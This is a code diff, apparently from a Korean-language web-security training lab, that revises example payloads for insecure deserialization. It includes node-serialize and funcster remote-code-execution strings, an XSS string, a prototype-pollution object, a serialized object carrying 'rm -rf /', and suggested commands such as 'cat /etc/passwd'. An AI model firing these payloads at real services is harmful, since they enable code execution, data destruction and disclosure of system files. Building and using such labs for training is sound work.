@@ -600,7 +600,7 @@ class AdvancedDeserializationTest {
             switch ($payload_type) {
                 case 'node_serialize':
                     $endpoint = 'node_serialize';
-                    $payload = $custom_payload ?: '{"username":"admin","rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
+                    $payload = $custom_payload ?: '{"username":"admin","cmd_result":"_$$ND_FUNC$$_function(){return require(\'child_process\').execSync(\'whoami\').toString();}()"}';
                     $post_data = [
                         'payload' => $payload
                     ];
@@ -1297,13 +1297,13 @@ O:11:"SystemShell":2:{s:3:"cmd";s:8:"rm -rf /";s:6:"target";s:4:"root";}
                     <h5>⚡ 페이로드 예제들:</h5>
                     <div id="nodejs-payload-examples">
                         <div class="payload-examples">
-node-serialize RCE:
-{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()"}
+node-serialize RCE (결과가 응답에 포함됨):
+{"cmd_result":"_$$ND_FUNC$$_function(){return require('child_process').execSync('whoami').toString();}()"}
 
 serialize-javascript XSS:
 {"name":"&lt;/script&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;","data":"malicious"}
 
-funcster RCE:
+funcster RCE (결과가 응답에 포함됨):
 function() { return require("child_process").execSync("whoami").toString(); }
 
 cryo Prototype Pollution:
@@ -1315,6 +1315,7 @@ cryo Prototype Pollution:
 - ls -la (파일 목록)
 - cat /etc/passwd (시스템 정보)
 - ps aux (실행 프로세스)
+- uname -a (시스템 정보)
                         </div>
                     </div>
                 </div>
@@ -1404,7 +1405,7 @@ cryo Prototype Pollution:
             const select = document.getElementById('nodejs_type');
             const textarea = document.getElementById('nodejs_payload');
             const examples = {
-                'node_serialize': '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\');}()"}',
+                'node_serialize': '{"cmd_result":"_$$ND_FUNC$$_function(){return require(\'child_process\').execSync(\'whoami\').toString();}()"}',
                 'serialize_javascript': '{"name":"[XSS Script Tag]","data":"malicious content"}',
                 'funcster': 'function() { return require("child_process").execSync("whoami").toString(); }',
                 'cryo': '{"__proto__":{"polluted":"yes","isAdmin":true,"compromised":"WebSec-Lab"},"normalData":"hello"}'
